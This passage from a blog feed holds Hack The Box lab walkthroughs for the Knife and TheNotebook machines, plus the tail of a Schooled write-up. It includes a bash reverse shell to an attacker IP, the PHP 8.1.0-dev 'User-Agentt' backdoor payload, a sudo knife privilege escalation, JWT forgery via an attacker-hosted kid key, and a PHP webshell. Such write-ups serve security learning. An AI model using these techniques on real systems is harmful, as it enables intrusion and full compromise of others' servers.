connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234] 16349
<span class="c"># cd /root</span>
<span class="c"># cat root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed it!</p>

<p>See you at the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HTB Linux" /><category term="HTB Medium" /><category term="HackTheBox" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Schooled, another medium-rated Linux box from Hack The Box, created by TheCyberGeek.]]></summary></entry><entry><title type="html">Walktrough: HTB Knife</title><link href="https://davicruz.com/walkthrough/2021/08/htb-knife" rel="alternate" type="text/html" title="Walktrough: HTB Knife" /><published>2021-08-28T09:00:00-03:00</published><updated>2021-08-28T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/08/htb-knife</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/08/htb-knife"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Knife</strong>, another easy-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/98767">MrKN16H</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/3IO9vBj.png" alt="HTB Knife" class="align-center" /></p>

<p>This was a pretty straightforward box where you must pay attention to the details (in the case of the vulnerable web server) and always go for the low-hanging fruits first like abusing the <code class="language-plaintext highlighter-rouge">sudo</code> permissions user already have.</p>

<p>I hope you guys enjoy it!</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to check the published services on this box:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.242
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-10 17:50 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.242
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.42 seconds
</code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Accessing the website we can see a simple institutional page from a health company, as below:</p>

<p><img src="https://i.imgur.com/oAbssxJ.png" alt="HTB Knife - HTTP Service" class="align-center" /></p>

<p>After accessing the website, gathered some information about the page, its components, and the server from which it was published using <code class="language-plaintext highlighter-rouge">whatweb,</code> and what called attention was the <code class="language-plaintext highlighter-rouge">X-Powered-By</code> header pointing to a <strong>dev</strong> version of <strong>PHP 8.1.0</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">--color</span><span class="o">=</span>never <span class="nt">-a</span> 3 10.10.10.242 | <span class="nb">tee </span>whatweb.txt
http://10.10.10.242 <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.242], PHP[8.1.0-dev], , Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
</code></pre></div></div>

<h2 id="initial-access-and-user-flag">Initial Access and User flag</h2>

<p>As dev versions often contain vulnerabilities, decided to search it using <code class="language-plaintext highlighter-rouge">searchsploit</code> and found an RCE vulnerability as listed below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="s2">"8.1.0-dev"</span>
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
 Exploit Title                                                        |  Path
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
PHP 8.1.0-dev - <span class="s1">'User-Agentt'</span> Remote Code Execution                   | php/webapps/49933.py
<span class="nt">----------------------------------------------------------------------</span> <span class="nt">----------------------------</span>
Shellcodes: No Results
</code></pre></div></div>

<p>This vulnerability consists in a backdor which was added in some commits of PHP source code by compromised accounts and, when a request arrives with a header <code class="language-plaintext highlighter-rouge">User-Agentt: "zerodiumsystem('cmd');"</code>, the <code class="language-plaintext highlighter-rouge">cmd</code> will be interpreted and executed in the system. The payload available emulate a non-interactive shell and, from it, started an interactive session using the payload <code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.10.10/4443 0&gt;&amp;1'</code> which returned a session from <strong>james</strong>’s user account, where in his home directory I was able to read the contents of <code class="language-plaintext highlighter-rouge">user.txt</code>, obtaining the first flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
knife
james@knife:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
&lt;redacted&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<p>As usual, started with the command <code class="language-plaintext highlighter-rouge">sudo -l</code> and we were lucky once again, as output below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>james on knife:
   env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User james may run the following commands on knife:
   <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife              
</code></pre></div></div>

<p>Doing a quick search on this binary, found out that it’s related to <a href="https://www.chef.io/">Chef’s Configuration Management Solution</a> and, according to <a href="https://gtfobins.github.io/gtfobins/knife/#sudo">knife | GTFOBins</a> page, could be easily used to privesc to root, as below, allowing us to get the final flag :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nt">--help</span>                                                                                 Chef Infra Client: 16.10.8

Docs: https://docs.chef.io/workstation/knife/
Patents: https://www.chef.io/patents

<span class="o">[</span>...]

james@knife:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
<span class="c"># cat root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed!</p>

<p>See you at the next post :smile:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Knife, another easy-rated Linux box from Hack The Box, created by MrKN16H.]]></summary></entry><entry><title type="html">Walktrough: HTB TheNotebook</title><link href="https://davicruz.com/walkthrough/2021/07/htb-thenotebook" rel="alternate" type="text/html" title="Walktrough: HTB TheNotebook" /><published>2021-07-31T09:00:00-03:00</published><updated>2021-07-31T09:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/07/htb-thenotebook</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/07/htb-thenotebook"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>TheNotebook</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/120514">mostwanted002</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/DSrrFJP.png" alt="HTB TheNotebook" class="align-center" /></p>

<p>This box was a very interesting one, where I had the opportunity to learn more about JWT Tokens in the path for initial access and then more docker escaping techniques abusing capabilities so I could get root.</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, we start with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to see which services are published in this box.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.230                                                                                       
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-10 15:05 <span class="nt">-03</span>
Stats: 0:00:01 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>0 up<span class="o">)</span>, 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% <span class="k">done
</span>Nmap scan report <span class="k">for </span>10.10.10.230
Host is up <span class="o">(</span>0.072s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.97 seconds
</code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Accessing the page, noticed that is a simple HTTP application, which uses the default <a href="https://getbootstrap.com/">Bootstrap</a> and no sign of a CMS like WordPress or other known application.</p>

<p><img src="https://i.imgur.com/kJx4QaU.png" alt="HTB TheNotebook - 80/TCP" class="align-center" /></p>

<p>The guessing was confirmed during <code class="language-plaintext highlighter-rouge">whatweb</code> execution, which listed only the two known components, as well as the webserver it is running on which is an <em>Nginx</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb 10.10.10.230
http://10.10.10.230 <span class="o">[</span>200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
</code></pre></div></div>

<p>Checking the website with <code class="language-plaintext highlighter-rouge">gobuster</code> found the following application pages but were the same already seen inspecting the source code during initial navigation.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.230 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,txt,php <span class="nt">-t</span> 50 <span class="nt">-o</span> gobuster.txt
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://10.10.10.230
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 50
<span class="o">[</span>+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              html,txt,php
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2021/06/10 16:04:30 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250]
/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422]
/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9]
/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.230/]

<span class="o">===============================================================</span>
2021/06/10 16:34:27 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>As I haven’t found anything specific, decided to poke a little bit with this app, while inspecting the requests using Burp Suite, looking for an opportunity.</p>

<p>Started by creating an account, clicking on the <em>Register</em> link where some basic information was requested as the image below, and resulted in the account creation without any further problem.</p>

<p><img src="https://i.imgur.com/e49Cij7.png" alt="HTB TheNotebook - SignUp" class="align-center" /></p>

<p>After being created, was redirected to a logged page where I was able to create some notes but interacting with these resources didn’t seem that they could be exploited, unless the app would be vulnerable by some kind of <strong>SSTI</strong> (Server-Side Template Injection) once these notes are shown in the page.</p>

<p><img src="https://i.imgur.com/hPKhMaT.png" alt="HTB TheNotebook - Logged User" class="align-center" /></p>

<p>Inspecting the requests made so far in Burp since the account creation, nothing interesting was found in the request that could be tampered with to grant us a privileged account but his response is interesting. In this response, we receive a <code class="language-plaintext highlighter-rouge">Set-Cookie</code> for an object named <code class="language-plaintext highlighter-rouge">auth</code>, which contained something that resembled a <strong>Token JWT</strong>.</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">FOUND</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.14.0 (Ubuntu)</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 10 Jun 2021 20:46:42 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">209</span>
<span class="na">Location</span><span class="p">:</span> <span class="s">http://10.10.10.230/</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjowfQ.Ixm8_VYcfY_WAv0L7i27vyOW15dd2UuhhlOrRaSiwVFyge6_JmC2FjUEYHNh_j4xXFjfaeUR7gkifezXjsJwz99U1zpcp0CaOI9-RWXLSTpnZvprcCCyN5seCkJHNx45-Qb5mCjGDGQbrxkrcUuV8tVcdkEpFi90BfXL6XGGxJe-Ms6YiDWK1fhpaGfKXcRyAYUGWoTs62ulrVwV5fKhH978OE17egmvNWpOL0dNpmpdoCTTKYBX1KDyyFMWJvZWkydPCNPPAaqk0pNxSwiWOYzBBErx2EBd58gpZWlBLNf5JnjyoBXdHt4JdHVcpoZsmBsAT_gxRU_uffzwxTNQN9-vrsA7tLzWuyWWt32s_8hGGrauEBSW4aPP5xRbpGclDfw2KPa7qHdVa5SApHHQrDFfpxhU2hFjvjlBtmwfjJbNHb53ZRXmz0SPRLKf6sOpX3Iswld58yBYP9xtIr3eCsdW1boCsDflfjUi9LQqsM3d_PTgGgzBLIXBQXXj82i0CzlwD3rYl3AjR7IBgBZNee5HJVdNUPYx6e_uG7WU94LUBy7WsfPfYY8VHjbuWVY1Nq3Wqhg2Sb04XmWBbtbV5C12YOu-oA7A6KrloeGOjLHkIlTsnLAj3eNhl_eo5aiLuQL3P5HrGr0K_rrniLHTCGTWX3KM4qgtI57IsbXN0Dw; Path=/</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">uuid=796e6cc3-aa50-4f87-b74f-408146886c66; Path=/</span>

<span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
<span class="nt">&lt;title&gt;</span>Redirecting...<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;h1&gt;</span>Redirecting...<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;p&gt;</span>You should be redirected automatically to target URL: <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>/<span class="nt">&lt;/a&gt;</span>.  If not click the link.
</code></pre></div></div>

<p>Checking its content at <a href="https://jwt.ms/">jwt.ms</a>, noticed some details that could allow us to elevate our privileges:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">kid</code> header, which defines the private key location in an HTTP Server running locally in the application server, is used to sign and evaluate the issued token.</li>
  <li><code class="language-plaintext highlighter-rouge">admin_cap</code> payload, which possibly contains a binary or integer that <strong>represents the privilege/role</strong> of the user, that for our recently created account is 0.</li>
</ul>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:7070/privKey.key"</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="w">
  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe@dummy.com"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"admin_cap"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">[</span><span class="err">Signature</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>The fact is: We cannot modify the issued token without signing it again with the key available in the server, but, once the token has a field pointing to the path to the key to which it was signed, we could get a chance to recreate this token, signing it with our own RSA key and <strong>making it available to the backend</strong> during our credential validation, but we can only be sure testing :stuck_out_tongue_winking_eye:.</p>

<h2 id="initial-access">Initial access</h2>

<p>Once we need to create a token, searching for the easiest way to do it I have found a python library called <a href="https://pyjwt.readthedocs.io/en/stable/">PyJWT</a> that seemed quite easy to be used. In the initial docs page, we have a sample code signing a token but we need to dig further in their documentation to find a way to add the <code class="language-plaintext highlighter-rouge">kid</code> header and create the cert.</p>

<p>Achieved the desired outcome by running the following steps:</p>

<ul>
  <li>Created the RSA key using the command line below. We’ll have as output the content of the public key and, in the specified file, the private key.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req <span class="nt">-nodes</span> <span class="nt">-new</span> <span class="nt">-x509</span> <span class="nt">-keyout</span> privKey.key <span class="nt">-noout</span> <span class="nt">-pubkey</span>
</code></pre></div></div>

<ul>
  <li>Published the private key using a simple HTTP Server, using the same port web server was using in the observed token.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7070
</code></pre></div></div>

<ul>
  <li>
    <p>After creating the key, wrote a script as content below using the obtained values of public and private keys and signed the payload. This script uses examples located at <a href="https://pyjwt.readthedocs.io/en/stable/usage.html">Usage Examples</a> in the official module documentation.</p>

    <ul>
      <li>Necessary to install the module using the command <code class="language-plaintext highlighter-rouge">pip3 install pyjwt</code>. In case <code class="language-plaintext highlighter-rouge">jwt</code> module is already installed, necessary to remove it first, otherwise, the script will fail.</li>
    </ul>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">jwtprivate_key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"""</span><span class="s">-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDT/8rR3ZkWJOJN
[...]
XDmj7j8p7kdd2ZM1MYTO6A0=
-----END PRIVATE KEY-----</span><span class="sh">"""</span>
<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">jdoe</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">jdoe@dummy.com</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">admin_cap</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span>
<span class="p">}</span>
<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">kid</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://10.10.10.10:7070/privKey.key</span><span class="sh">"</span><span class="p">}</span>
<span class="n">encoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">RS256</span><span class="sh">"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
</code></pre></div></div>

<p>Sample output is pasted below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 generate-jwt.py
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMTY6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Impkb2UiLCJlbWFpbCI6Impkb2VAZHVtbXkuY29tIiwiYWRtaW5fY2FwIjoxfQ.WMokYjjMMECoF2UWM2fcMVcR99X34dHXwuj8nXqBlQWOnwC1NdBoO6PD-ZHjAZ5p969Jbf4XnRKZedAAokxvIgG2ymYNV1F8CcDzDfuHlMlk_CiYGvimoJWgvA3S-24KDql2bRrvJgoPbKKjqJ5Ir7mWZF1USGSwsttc9Ff1qniFAWTJ8CXkTLtfR498_rY_uIJfBdvqTbi3C9fWJcnSwjCGROkEGxCYve4cf5rjFvm_D_G5-S8oWkXICYAFp5lMQ288E0qGQp04nD16H1v2YzOROolNDeqMVB2uaI060xjKEA8mv6taa095q7rEqzpzXSj21Uq2-xcZonk0LI1-yg
</code></pre></div></div>

<p>The generated token, according to jwt.ms, generated the payload below:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"typ"</span><span class="p">:</span><span class="w"> </span><span class="s2">"JWT"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://10.10.10.10:7070/privKey.key"</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jdoe@dummy.com"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"admin_cap"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="err">.</span><span class="p">[</span><span class="err">Signature</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>As everything went as expected, is now time to change the cookie value in the browser and <strong>:boom:</strong>: a request was received in the python webserver by the backend, and we can now see the <strong>Admin Panel</strong> option while accessing the portal :smile:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 7070Serving HTTP on 0.0.0.0 port 7070 <span class="o">(</span>http://0.0.0.0:7070/<span class="o">)</span> ...10.10.10.230 - - <span class="o">[</span>10/Jun/2021 18:45:24] <span class="s2">"GET /privKey.key HTTP/1.1"</span> 200 -
</code></pre></div></div>

<p><img src="https://i.imgur.com/NrGXJx9.png" alt="HTB TheNotebook - Admin Panel" class="align-center" /></p>

<ul>
  <li>Analyzing what we can do next with the permissions we have from an administrator perspective, we can see two options: list existing notes and upload a file.</li>
</ul>

<p><img src="https://i.imgur.com/fSYkzLZ.png" alt="HTB TheNotebook - Admin Options" class="align-center" /></p>

<ul>
  <li>Reviewing the content of existing notes, we were able to see all notes in the app, as the table below. Pay attention to the notes from <strong>admin</strong> which mentions an existing backup in the server as well as the <strong>ability to execute PHP files in the server</strong>:</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Title</th>
      <th>Note</th>
      <th>Owner</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Need to fix config</td>
      <td>Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>Backups are scheduled</td>
      <td>Finally! Regular backups are necessary. Thank god it’s all easy on server.</td>
      <td>admin</td>
    </tr>
    <tr>
      <td>The Notebook Quotes</td>
      <td>“I am nothing special, of this I am sure. I am a common man with common thoughts and I’ve led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I’ve loved another with all my heart and soul, and to me, this has always been enough..” ― Nicholas Sparks, The Notebook “So it’s not gonna be easy. It’s going to be really hard; we’re gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me… everyday.” ― Nicholas Sparks, The Notebook “You can’t live your life for other people. You’ve got to do what’s right for you, even if it hurts some people you love.” ― Nicholas Sparks, The Notebook “You are, and always have been, my dream.” ― Nicholas Sparks, The Notebook “You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together.” ― Nicholas Sparks, The Notebook “I love you. I am who I am because of you. You are every reason, every hope, and every dream I’ve ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. “ ― Nicholas Sparks, The Notebook “We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that’s why every minute we spent together has been seared in my memory. I’ll never forget a single moment of it.” ― Nicholas Sparks, The Notebook</td>
      <td>noah</td>
    </tr>
    <tr>
      <td>Is my data safe?</td>
      <td>I wonder is the admin good enough to trust my data with?</td>
      <td>noah</td>
    </tr>
  </tbody>
</table>

<p>Once we could possibly upload and run PHP files, decided to make a test, following the steps below:</p>

<ul>
  <li>
    <p>Accessing the <em>File Upload</em> we have a simple page to post our files, where we’re going to inspect the requests using burp.</p>

    <p><img src="https://i.imgur.com/fgI2wmr.png" alt="HTB TheNotebook - File Upload" class="align-center" /></p>

    <ul>
      <li>
        <p>Creating a simple webshell with the content <code class="language-plaintext highlighter-rouge">&lt;?php system($_GET['cmd']);?&gt;</code>, made its upload and didn’t received any warning or block during the action.</p>
      </li>
      <li>
        <p>After uploading it, the file was listed on the page, and hitting the <em>View</em> butting, we were redirected to the path where the file was, allowing us to see the rendered content.</p>
      </li>
    </ul>

    <p><img src="https://i.imgur.com/aCdIwnN.png" alt="HTB TheNotebook - Uploaded Files" class="align-center" /></p>

    <ul>
